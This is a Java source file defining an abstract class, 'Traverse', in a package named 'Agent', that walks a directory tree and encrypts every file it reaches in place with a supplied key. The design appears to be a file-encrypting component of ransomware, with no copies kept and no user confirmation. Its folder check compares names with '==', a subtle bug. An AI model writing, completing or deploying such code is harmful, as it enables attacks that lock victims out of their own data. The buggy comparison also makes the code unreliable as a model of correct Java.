package Agent.traversal;

import java.io.File;
import java.util.Collection;
import Agent.EncryptionAlgo.JavaCryptoUtil;
import Agent.entites.CryptoKey;


public abstract class Traverse {

	// Check if specific directory is already found in the folder tree
	public boolean isVisitedFolder(File file, Collection<File> folderTree) {
		if (folderTree == null)
			return false;
		else {
			for (File directory : folderTree) {

				if (directory.getName() == file.getName()) {
					return true;
				}
			}
			return false;
		}

	}

	public void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key)  {

		addToStruct(new File(inputDir));
		while (!(checkEmptyStruct())) {
			/* get next file/directory */
			File current = removeFromStruct();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {
						try {

							if (!(isVisitedFolder(file, dirs))) {

								dirs.add(file);

							}
						} catch (NullPointerException e) {
							
						}
						addToStruct(file);

					} else if (file.isFile()) {

						JavaCryptoUtil crypto = new JavaCryptoUtil();
						crypto.encrypt(key.getKey(), file, key.getAlgorithm());

					}
				}

			}
		}
	}

	public abstract void addToStruct(File file);

	public abstract File removeFromStruct();

	public abstract boolean checkEmptyStruct();

}
